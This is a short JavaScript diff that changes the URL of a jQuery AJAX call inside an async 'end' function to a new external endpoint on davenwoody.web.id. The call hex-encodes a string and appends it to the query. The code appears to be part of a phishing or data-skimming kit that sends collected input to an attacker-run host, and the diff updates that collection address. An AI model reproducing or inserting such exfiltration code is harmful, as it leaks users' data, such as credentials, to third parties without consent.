@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://pusat.davenwoody.web.id?cat="+
+                    "https://support-data-cloud.davenwoody.web.id/source/?json="+
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
